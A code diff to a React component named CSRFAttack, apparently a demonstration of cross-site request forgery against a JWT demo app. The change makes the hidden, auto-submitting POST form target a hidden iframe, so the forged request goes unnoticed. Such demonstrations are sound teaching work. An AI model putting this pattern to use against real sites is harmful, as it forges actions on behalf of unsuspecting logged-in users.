@@ -8,12 +8,16 @@ export function CSRFAttack() {
   }, [formRef]);
 
   return (
-    <form
-      ref={formRef}
-      action="https://jwt-local-variable.vercel.app/api/quotes"
-      method="POST"
-    >
-      <input type="hidden" name="bgColor" value="bg-blue-600" />
-    </form>
+    <>
+      <iframe className="hidden" name="csrf-frame"></iframe>
+      <form
+        ref={formRef}
+        action="https://jwt-local-variable.vercel.app/api/quotes"
+        method="POST"
+        target="csrf-frame"
+      >
+        <input type="hidden" name="bgColor" value="bg-blue-600" />
+      </form>
+    </>
   );
 }
